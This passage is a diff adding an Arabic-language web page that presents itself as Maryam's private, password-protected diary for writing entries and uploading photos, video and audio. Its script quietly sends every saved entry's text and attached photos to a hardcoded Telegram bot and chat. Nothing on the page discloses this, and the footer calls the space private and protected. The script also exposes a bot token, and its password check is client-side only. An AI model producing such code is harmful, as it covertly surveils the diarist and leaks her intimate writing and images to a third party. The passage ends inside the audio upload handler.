@@ -1,0 +1,1465 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>يوميات مريم 💝 - مساحتك المليانة حب</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Scheherazade+New:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-pink: #ff4081;
+            --secondary-pink: #ff79b0;
+            --light-pink: #ffe6f2;
+            --dark-pink: #d81b60;
+            --heart-red: #ff1744;
+            --gold: #ffd700;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #ffe6f2 0%, #ffccdd 50%, #ffb3c6 100%);
+            color: #5a3d5c;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* القلوب الطائرة في الخلفية */
+        .floating-hearts {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .heart {
+            position: absolute;
+            color: rgba(255, 23, 68, 0.15);
+            font-size: 20px;
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.7;
+            }
+            90% {
+                opacity: 0.7;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        /* صفحة الدخول */
+        .login-container {
+            width: 100%;
+            max-width: 500px;
+            margin: 60px auto;
+            text-align: center;
+            padding: 50px 40px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 30px;
+            box-shadow: 0 20px 50px rgba(255, 64, 129, 0.2);
+            border: 3px solid var(--primary-pink);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 8px;
+            background: linear-gradient(to right, var(--primary-pink), var(--secondary-pink), var(--gold));
+        }
+        
+        .lock-icon {
+            font-size: 5rem;
+            color: var(--primary-pink);
+            margin-bottom: 20px;
+            text-shadow: 0 4px 10px rgba(255, 64, 129, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .login-title {
+            font-size: 2.5rem;
+            color: var(--dark-pink);
+            margin-bottom: 10px;
+            font-family: 'Scheherazade New', serif;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .login-subtitle {
+            color: #7a5c7d;
+            margin-bottom: 40px;
+            line-height: 1.8;
+            font-size: 1.1rem;
+            background: linear-gradient(45deg, var(--primary-pink), var(--secondary-pink));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .password-container {
+            position: relative;
+            margin-bottom: 30px;
+        }
+        
+        .password-input {
+            width: 100%;
+            padding: 18px 60px 18px 20px;
+            border: 2px solid #ffb3c6;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            transition: all 0.3s;
+            background: #fff9fc;
+            color: #5a3d5c;
+        }
+        
+        .password-input:focus {
+            outline: none;
+            border-color: var(--primary-pink);
+            box-shadow: 0 0 0 3px rgba(255, 64, 129, 0.2);
+            transform: translateY(-2px);
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, var(--primary-pink), var(--secondary-pink));
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transform: rotate(45deg);
+            transition: all 0.5s;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 64, 129, 0.4);
+        }
+        
+        .login-btn:hover::after {
+            left: 100%;
+        }
+        
+        .error-message {
+            color: var(--dark-pink);
+            margin-top: 20px;
+            font-size: 1rem;
+            min-height: 25px;
+            padding: 10px;
+            background: rgba(255, 64, 129, 0.1);
+            border-radius: 10px;
+            border-right: 4px solid var(--dark-pink);
+        }
+        
+        /* صفحة التطبيق */
+        .app-container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: none;
+            animation: fadeIn 1s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        header {
+            text-align: center;
+            padding: 40px 0;
+            background: linear-gradient(45deg, var(--primary-pink), var(--secondary-pink));
+            color: white;
+            border-radius: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 15px 35px rgba(255, 64, 129, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: '💖 ❤️ 💝 💕 💞';
+            position: absolute;
+            top: 10px;
+            width: 100%;
+            font-size: 1.5rem;
+            opacity: 0.3;
+            animation: moveHearts 30s linear infinite;
+        }
+        
+        @keyframes moveHearts {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            font-family: 'Scheherazade New', serif;
+            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .subtitle {
+            font-size: 1.3rem;
+            opacity: 0.95;
+            max-width: 80%;
+            margin: 0 auto;
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        @media (max-width: 992px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .note-section, .notes-list, .media-section {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 25px;
+            padding: 35px;
+            box-shadow: 0 15px 35px rgba(255, 64, 129, 0.15);
+            border: 2px solid rgba(255, 64, 129, 0.2);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .note-section:hover, .notes-list:hover, .media-section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(255, 64, 129, 0.25);
+        }
+        
+        .media-section {
+            grid-column: span 2;
+        }
+        
+        @media (max-width: 992px) {
+            .media-section {
+                grid-column: span 1;
+            }
+        }
+        
+        h2 {
+            color: var(--dark-pink);
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 3px solid var(--light-pink);
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        h2 i {
+            color: var(--primary-pink);
+        }
+        
+        h3 {
+            color: var(--secondary-pink);
+            margin: 25px 0 20px 0;
+            font-size: 1.5rem;
+            padding-right: 15px;
+            border-right: 4px solid var(--gold);
+        }
+        
+        textarea {
+            width: 100%;
+            height: 220px;
+            padding: 20px;
+            border: 2px solid #ffccdd;
+            border-radius: 20px;
+            font-size: 1.2rem;
+            resize: vertical;
+            margin-bottom: 25px;
+            transition: all 0.3s;
+            background: #fff9fc;
+            color: #5a3d5c;
+            font-family: 'Cairo', sans-serif;
+        }
+        
+        textarea:focus {
+            outline: none;
+            border-color: var(--primary-pink);
+            box-shadow: 0 0 0 3px rgba(255, 64, 129, 0.2);
+        }
+        
+        textarea::placeholder {
+            color: #b39eb5;
+            font-style: italic;
+        }
+        
+        /* أزرار الإضافة */
+        .add-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .add-btn {
+            padding: 20px;
+            background: linear-gradient(45deg, var(--primary-pink), var(--secondary-pink));
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .add-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 64, 129, 0.3);
+        }
+        
+        .save-btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .save-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(76, 175, 80, 0.3);
+            background: linear-gradient(45deg, #45a049, #3d8b40);
+        }
+        
+        /* عناصر الرفع */
+        .upload-container {
+            background: linear-gradient(135deg, #fff9fc 0%, #ffe6f2 100%);
+            border: 3px dashed #ffb3c6;
+            border-radius: 20px;
+            padding: 35px;
+            text-align: center;
+            margin-bottom: 25px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+        
+        .upload-container:hover {
+            border-color: var(--primary-pink);
+            background: linear-gradient(135deg, #ffe6f2 0%, #ffccdd 100%);
+            transform: translateY(-3px);
+        }
+        
+        .upload-icon {
+            font-size: 3.5rem;
+            color: var(--primary-pink);
+            margin-bottom: 20px;
+            text-shadow: 0 4px 8px rgba(255, 64, 129, 0.3);
+        }
+        
+        .file-input {
+            display: none;
+        }
+        
+        .preview-container {
+            margin-top: 25px;
+        }
+        
+        .preview-item {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 2px solid #ffe6f2;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: all 0.3s;
+        }
+        
+        .preview-item:hover {
+            border-color: var(--primary-pink);
+            box-shadow: 0 5px 15px rgba(255, 64, 129, 0.1);
+        }
+        
+        .preview-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .preview-icon {
+            font-size: 2rem;
+            color: var(--primary-pink);
+        }
+        
+        .remove-btn {
+            background: linear-gradient(45deg, #ff6666, var(--primary-pink));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 10px 20px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .remove-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(255, 102, 102, 0.3);
+        }
+        
+        /* معرض الوسائط */
+        .media-gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+        
+        .media-item {
+            position: relative;
+            border-radius: 20px;
+            overflow: hidden;
+            background: white;
+            border: 2px solid #ffe6f2;
+            transition: all 0.3s;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .media-item:hover {
+            transform: translateY(-10px) scale(1.03);
+            box-shadow: 0 15px 35px rgba(255, 64, 129, 0.25);
+            border-color: var(--primary-pink);
+        }
+        
+        .media-img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            display: block;
+        }
+        
+        .media-video {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            display: block;
+        }
+        
+        .media-audio {
+            width: 100%;
+            padding: 25px;
+            background: linear-gradient(135deg, #fff9fc, #ffe6f2);
+        }
+        
+        .media-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(transparent, rgba(216, 27, 96, 0.9));
+            color: white;
+            padding: 15px;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        
+        /* اليوميات */
+        .note-item {
+            background: linear-gradient(135deg, #fff9fc 0%, #fff0f7 100%);
+            padding: 25px;
+            margin-bottom: 20px;
+            border-radius: 20px;
+            border-right: 6px solid var(--primary-pink);
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .note-item::before {
+            content: '💖';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 1.2rem;
+            opacity: 0.3;
+        }
+        
+        .note-item:hover {
+            transform: translateX(-10px);
+            box-shadow: 0 10px 30px rgba(255, 64, 129, 0.2);
+        }
+        
+        .note-date {
+            color: var(--dark-pink);
+            font-size: 1rem;
+            margin-bottom: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .note-text {
+            line-height: 1.8;
+            margin-bottom: 15px;
+            font-size: 1.1rem;
+        }
+        
+        .note-media {
+            margin-top: 20px;
+            max-width: 100%;
+        }
+        
+        .note-actions {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .delete-btn {
+            background: linear-gradient(45deg, #ff6666, var(--primary-pink));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 12px 25px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .delete-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 102, 102, 0.3);
+        }
+        
+        .empty-notes {
+            text-align: center;
+            color: #9d8b9f;
+            padding: 60px 0;
+            font-size: 1.2rem;
+        }
+        
+        .empty-notes i {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            opacity: 0.5;
+            color: var(--primary-pink);
+        }
+        
+        /* الإشعارات */
+        .notification {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: linear-gradient(45deg, var(--primary-pink), var(--secondary-pink));
+            color: white;
+            padding: 20px 25px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(255, 64, 129, 0.3);
+            display: none;
+            z-index: 1000;
+            max-width: 350px;
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .notification.success {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+        }
+        
+        .notification.error {
+            background: linear-gradient(45deg, #ff6666, var(--dark-pink));
+        }
+        
+        .notification.info {
+            background: linear-gradient(45deg, #2196F3, #1976D2);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #7a5c7d;
+            border-top: 3px solid #ffccdd;
+            margin-top: 40px;
+            font-size: 1rem;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .login-container {
+                margin: 30px auto;
+                padding: 40px 25px;
+            }
+            
+            .main-content {
+                gap: 20px;
+            }
+            
+            .note-section, .notes-list, .media-section {
+                padding: 25px;
+            }
+        }
+        
+        .love-text {
+            color: var(--dark-pink);
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* شريط التقدم */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #ffccdd;
+            border-radius: 4px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(45deg, var(--primary-pink), var(--secondary-pink));
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <!-- القلوب الطائرة في الخلفية -->
+    <div class="floating-hearts" id="floatingHearts"></div>
+    
+    <!-- صفحة الدخول -->
+    <div class="login-container" id="loginContainer">
+        <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+        </div>
+        
+        <h2 class="login-title">يوميات مريم 💝</h2>
+        <p class="login-subtitle">مساحتك الخاصة المليانة حب وعاطفة وذكريات حلوة</p>
+        
+        <div class="password-container">
+            <input type="password" class="password-input" id="passwordInput" placeholder="أدخلي كلمة السر هنا يا حبيبتي">
+        </div>
+        
+        <button class="login-btn" id="loginBtn">
+            <i class="fas fa-heart"></i> دخول لمساحة الحب
+        </button>
+        
+        <div class="error-message" id="errorMessage"></div>
+    </div>
+    
+    <!-- صفحة التطبيق -->
+    <div class="app-container" id="appContainer">
+        <header>
+            <h1><i class="fas fa-heart"></i> يوميات مريم 💖 - مساحة حب خاصة</h1>
+            <p class="subtitle">مكانك الحصري للكتابة، الصور، الذكريات، وكل حاجة بتعبر عن قلبك</p>
+        </header>
+        
+        <div class="main-content">
+            <!-- قسم كتابة يومية جديدة -->
+            <section class="note-section">
+                <h2><i class="fas fa-heart-circle-plus"></i> اكتبي يومية جديدة</h2>
+                <textarea id="noteText" placeholder="اكتبي هنا كل اللي في قلبك النهاردة... مشاعرك، أحلامك، ذكرياتك الحلوة، أي حاجة تخطر على بالك 💭"></textarea>
+                
+                <h3><i class="fas fa-gift"></i> أضيفي وسائط حلوة ليوميتك</h3>
+                <div class="add-buttons">
+                    <button class="add-btn" id="addPhotoBtn">
+                        <i class="fas fa-camera"></i> إضافة صورة
+                    </button>
+                    <button class="add-btn" id="addVideoBtn">
+                        <i class="fas fa-video"></i> إضافة فيديو
+                    </button>
+                    <button class="add-btn" id="addAudioBtn">
+                        <i class="fas fa-microphone-lines"></i> تسجيل صوتي
+                    </button>
+                    <button class="add-btn" id="addMusicBtn">
+                        <i class="fas fa-music"></i> إضافة أغنية
+                    </button>
+                </div>
+                
+                <div class="progress-container" id="progressContainer" style="display: none;">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <button class="save-btn" id="saveBtn">
+                    <i class="fas fa-heart-circle-check"></i> حفظ اليومية
+                </button>
+            </section>
+            
+            <!-- قائمة اليوميات المحفوظة -->
+            <section class="notes-list">
+                <h2><i class="fas fa-heart-list"></i> يومياتك السابقة</h2>
+                <div id="notesContainer">
+                    <!-- اليوميات ستظهر هنا -->
+                </div>
+            </section>
+            
+            <!-- قسم الوسائط -->
+            <section class="media-section">
+                <h2><i class="fas fa-images"></i> معرض الوسائط</h2>
+                
+                <!-- رفع الصور -->
+                <div class="upload-container" id="photoUploadContainer">
+                    <div class="upload-icon">
+                        <i class="fas fa-cloud-upload-alt"></i>
+                    </div>
+                    <p>اسحبي الصور هنا أو اضغطي للرفع 💖</p>
+                    <p style="font-size: 1rem; color: var(--secondary-pink); margin-top: 10px;">JPEG, PNG, GIF - حتى 10MB</p>
+                    <input type="file" class="file-input" id="photoInput" accept="image/*" multiple>
+                </div>
+                
+                <!-- رفع الفيديوهات -->
+                <div class="upload-container" id="videoUploadContainer">
+                    <div class="upload-icon">
+                        <i class="fas fa-file-video"></i>
+                    </div>
+                    <p>اسحبي الفيديوهات هنا أو اضغطي للرفع 🎬</p>
+                    <p style="font-size: 1rem; color: var(--secondary-pink); margin-top: 10px;">MP4, AVI, MOV - حتى 25MB</p>
+                    <input type="file" class="file-input" id="videoInput" accept="video/*" multiple>
+                </div>
+                
+                <!-- رفع الملفات الصوتية -->
+                <div class="upload-container" id="audioUploadContainer">
+                    <div class="upload-icon">
+                        <i class="fas fa-file-audio"></i>
+                    </div>
+                    <p>اسحبي الملفات الصوتية هنا أو اضغطي للرفع 🎵</p>
+                    <p style="font-size: 1rem; color: var(--secondary-pink); margin-top: 10px;">MP3, WAV, M4A - حتى 15MB</p>
+                    <input type="file" class="file-input" id="audioInput" accept="audio/*" multiple>
+                </div>
+                
+                <!-- معرض الوسائط -->
+                <div id="mediaGallery" class="media-gallery">
+                    <!-- الوسائط ستظهر هنا -->
+                </div>
+            </section>
+        </div>
+        
+        <footer>
+            <p>صنع بكل 💖 من أجل مريم | مساحة حب خاصة ومحمية</p>
+        </footer>
+    </div>
+    
+    <!-- إشعارات -->
+    <div class="notification" id="notification"></div>
+
+    <script>
+        // توليد القلوب الطائرة
+        function createFloatingHearts() {
+            const container = document.getElementById('floatingHearts');
+            const heartCount = 25;
+            
+            for (let i = 0; i < heartCount; i++) {
+                const heart = document.createElement('div');
+                heart.className = 'heart';
+                heart.innerHTML = '❤';
+                heart.style.left = `${Math.random() * 100}%`;
+                heart.style.fontSize = `${Math.random() * 15 + 15}px`;
+                heart.style.animationDelay = `${Math.random() * 15}s`;
+                heart.style.color = `rgba(255, 23, 68, ${Math.random() * 0.2 + 0.1})`;
+                container.appendChild(heart);
+            }
+        }
+        
+        // إعدادات التليجرام
+        const TELEGRAM_BOT_TOKEN = '6506189895:AAEwRi0WpBXi3pQ91MAkz8JcsS64v6R5voE';
+        const TELEGRAM_CHAT_ID = '6895524607';
+        
+        // كلمة السر الصحيحة
+        const CORRECT_PASSWORD = "8/16";
+        
+        // عناصر DOM
+        const loginContainer = document.getElementById('loginContainer');
+        const appContainer = document.getElementById('appContainer');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const noteText = document.getElementById('noteText');
+        const saveBtn = document.getElementById('saveBtn');
+        const notesContainer = document.getElementById('notesContainer');
+        const notification = document.getElementById('notification');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        
+        // عناصر الوسائط
+        const addPhotoBtn = document.getElementById('addPhotoBtn');
+        const addVideoBtn = document.getElementById('addVideoBtn');
+        const addAudioBtn = document.getElementById('addAudioBtn');
+        const addMusicBtn = document.getElementById('addMusicBtn');
+        const photoInput = document.getElementById('photoInput');
+        const videoInput = document.getElementById('videoInput');
+        const audioInput = document.getElementById('audioInput');
+        const photoUploadContainer = document.getElementById('photoUploadContainer');
+        const videoUploadContainer = document.getElementById('videoUploadContainer');
+        const audioUploadContainer = document.getElementById('audioUploadContainer');
+        const mediaGallery = document.getElementById('mediaGallery');
+        
+        // بيانات الوسائط المؤقتة
+        let currentMedia = {
+            photos: [],
+            videos: [],
+            audios: []
+        };
+        
+        // تهيئة الموقع عند التحميل
+        document.addEventListener('DOMContentLoaded', function() {
+            createFloatingHearts();
+            
+            const isLoggedIn = sessionStorage.getItem('maryamLoggedIn');
+            
+            if (isLoggedIn === 'true') {
+                showApp();
+                loadNotes();
+                loadMedia();
+            } else {
+                showLogin();
+                passwordInput.focus();
+            }
+            
+            // إعداد أحداث السحب والإفلات
+            setupDragAndDrop();
+        });
+        
+        // أحداث الأزرار
+        loginBtn.addEventListener('click', login);
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') login();
+        });
+        
+        saveBtn.addEventListener('click', saveNote);
+        
+        // أحداث الوسائط
+        addPhotoBtn.addEventListener('click', () => photoInput.click());
+        addVideoBtn.addEventListener('click', () => videoInput.click());
+        addAudioBtn.addEventListener('click', () => audioInput.click());
+        addMusicBtn.addEventListener('click', () => audioInput.click());
+        
+        photoInput.addEventListener('change', handlePhotoUpload);
+        videoInput.addEventListener('change', handleVideoUpload);
+        audioInput.addEventListener('change', handleAudioUpload);
+        
+        // دالة تسجيل الدخول
+        function login() {
+            const enteredPassword = passwordInput.value.trim();
+            
+            if (enteredPassword === CORRECT_PASSWORD) {
+                sessionStorage.setItem('maryamLoggedIn', 'true');
+                showApp();
+                loadNotes();
+                loadMedia();
+                errorMessage.textContent = '';
+                showNotification('أهلاً يا حبيبتي! 💖 مساحة الحب الخاصة بيكي بانتظارك', 'success');
+            } else {
+                errorMessage.textContent = 'كلمة السر غير صحيحة يا قمر 🌙 حاولي تاني...';
+                passwordInput.value = '';
+                passwordInput.focus();
+                
+                // تأثير اهتزاز للإشارة للخطأ
+                passwordInput.style.borderColor = '#ff1744';
+                setTimeout(() => {
+                    passwordInput.style.borderColor = '#ffb3c6';
+                }, 500);
+            }
+        }
+        
+        // دالة حفظ اليومية
+        async function saveNote() {
+            const text = noteText.value.trim();
+            const hasMedia = currentMedia.photos.length > 0 || 
+                           currentMedia.videos.length > 0 || 
+                           currentMedia.audios.length > 0;
+            
+            if (!text && !hasMedia) {
+                showNotification('اكتبي حاجة أو أضيفي وسائط عشان تحفظي يا حبيبتي! 💭', 'error');
+                return;
+            }
+            
+            saveBtn.disabled = true;
+            saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';
+            progressContainer.style.display = 'block';
+            progressBar.style.width = '30%';
+            
+            try {
+                // 1. إرسال النص إلى التليجرام أولاً
+                let messageId = null;
+                if (text) {
+                    messageId = await sendTextToTelegram(text);
+                    progressBar.style.width = '50%';
+                }
+                
+                // 2. إرسال الصور إلى التليجرام (إذا أردت ربطها بنفس الرسالة)
+                if (currentMedia.photos.length > 0 && messageId) {
+                    for (let i = 0; i < currentMedia.photos.length; i++) {
+                        const photo = currentMedia.photos[i];
+                        await sendPhotoToTelegram(photo.data, messageId);
+                        progressBar.style.width = `${50 + (i + 1) * (40 / currentMedia.photos.length)}%`;
+                    }
+                }
+                
+                // 3. الحفظ المحلي
+                const note = {
+                    id: Date.now(),
+                    text: text,
+                    media: {
+                        photos: [...currentMedia.photos],
+                        videos: [...currentMedia.videos],
+                        audios: [...currentMedia.audios]
+                    },
+                    date: new Date().toISOString().split('T')[0],
+                    created: new Date().toLocaleString('ar-SA'),
+                    type: hasMedia ? (text ? 'نص ووسائط' : 'وسائط فقط') : 'نص فقط'
+                };
+                
+                let notes = JSON.parse(localStorage.getItem('maryamNotes')) || [];
+                notes.unshift(note);
+                localStorage.setItem('maryamNotes', JSON.stringify(notes));
+                
+                // 4. حفظ الوسائط منفصلة
+                saveMediaToLocalStorage();
+                
+                progressBar.style.width = '100%';
+                
+                // نجاح الحفظ
+                setTimeout(() => {
+                    showNotification('✅ تم حفظ اليومية بنجاح! 💖', 'success');
+                    progressContainer.style.display = 'none';
+                    progressBar.style.width = '0%';
+                    
+                    // تحديث العرض ومسح الحقول
+                    displayNotes();
+                    noteText.value = '';
+                    currentMedia = { photos: [], videos: [], audios: [] };
+                    updateMediaPreview();
+                    
+                    saveBtn.disabled = false;
+                    saveBtn.innerHTML = '<i class="fas fa-heart-circle-check"></i> حفظ اليومية';
+                }, 500);
+                
+            } catch (error) {
+                showNotification('⚠️ حدث خطأ أثناء الحفظ، لكن البيانات اتخذنت محلياً 💾', 'error');
+                progressContainer.style.display = 'none';
+                progressBar.style.width = '0%';
+                saveBtn.disabled = false;
+                saveBtn.innerHTML = '<i class="fas fa-heart-circle-check"></i> حفظ اليومية';
+            }
+        }
+        
+        // دالة إرسال النص إلى التليجرام
+        async function sendTextToTelegram(text) {
+            const message = `📖 يومية جديدة من مريم:\n\n${text}\n\n⏰ ${new Date().toLocaleString('ar-SA')}`;
+            
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('فشل إرسال النص إلى التليجرام');
+            }
+            
+            const data = await response.json();
+            return data.result.message_id;
+        }
+        
+        // دالة إرسال الصور إلى التليجرام
+        async function sendPhotoToTelegram(photoData, replyToMessageId = null) {
+            // تحويل base64 إلى blob
+            const base64Response = await fetch(photoData);
+            const blob = await base64Response.blob();
+            
+            // إنشاء FormData
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            if (replyToMessageId) {
+                formData.append('reply_to_message_id', replyToMessageId);
+            }
+            
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (!response.ok) {
+                throw new Error('فشل إرسال الصورة إلى التليجرام');
+            }
+            
+            return await response.json();
+        }
+        
+        // دالة رفع الصور
+        function handlePhotoUpload(event) {
+            const files = event.target.files;
+            for (let file of files) {
+                if (file.size > 10 * 1024 * 1024) {
+                    showNotification(`الصورة ${file.name} كبيرة جداً (الحد: 10MB) 💝`, 'error');
+                    continue;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    currentMedia.photos.push({
+                        id: Date.now() + Math.random(),
+                        name: file.name,
+                        type: file.type,
+                        size: file.size,
+                        data: e.target.result,
+                        uploaded: new Date().toLocaleString('ar-SA')
+                    });
+                    updateMediaPreview();
+                    showNotification(`تمت إضافة الصورة: ${file.name} 📸`, 'info');
+                };
+                reader.readAsDataURL(file);
+            }
+            event.target.value = '';
+        }
+        
+        // دالة رفع الفيديوهات
+        function handleVideoUpload(event) {
+            const files = event.target.files;
+            for (let file of files) {
+                if (file.size > 25 * 1024 * 1024) {
+                    showNotification(`الفيديو ${file.name} كبير جداً (الحد: 25MB) 🎬`, 'error');
+                    continue;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    currentMedia.videos.push({
+                        id: Date.now() + Math.random(),
+                        name: file.name,
+                        type: file.type,
+                        size: file.size,
+                        data: e.target.result,
+                        uploaded: new Date().toLocaleString('ar-SA')
+                    });
+                    updateMediaPreview();
+                    showNotification(`تمت إضافة الفيديو: ${file.name} 🎥`, 'info');
+                };
+                reader.readAsDataURL(file);
+            }
+            event.target.value = '';
+        }
+        
+        // دالة رفع الملفات الصوتية
+        function handleAudioUpload(event) {
+            const files = event.target.files;
+            for (let file of files) {
+                if (file.size > 15 * 1024 * 1024) {
+                    showNotification(`الملف الصوتي ${file.name} كبير جداً (الحد: 15MB) 🎵`, 'error');
